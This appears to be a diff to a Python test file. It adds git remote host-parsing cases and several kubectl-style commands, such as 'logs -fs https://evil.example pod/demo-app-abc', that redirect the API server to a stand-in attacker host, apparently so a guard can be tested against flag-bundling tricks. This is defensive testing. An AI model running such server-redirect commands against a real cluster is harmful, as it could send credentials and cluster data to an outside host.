@@ -173,6 +173,8 @@ def test_destinations_token_in_netloc_notes(url, scheme):
 
 @pytest.mark.parametrize("remote,expected", [
     ("git@github.com:you/cluster-wiki.git", "github.com"),
+    ("github.com:you/cluster-wiki.git", "github.com"),
+    ("localhost:path/to/wiki.git", "localhost"),
     ("ssh://git@git.example.com:2222/you/cluster-wiki.git", "git.example.com"),
     ("git+ssh://git@git.example.com/you/wiki.git", "git.example.com"),
     ("https://github.com/you/cluster-wiki.git", "github.com"),
@@ -571,6 +573,9 @@ SERVER_COMMANDS = [
     "get pods -shttps://evil.example",
     "get pods -As https://evil.example",
     "logs -s https://evil.example pod/demo-app-abc",
+    "logs -fs https://evil.example pod/demo-app-abc",
+    "logs -fAs https://evil.example pod/demo-app-abc",
+    "logs -fs=https://evil.example pod/demo-app-abc",
 ]
 
 
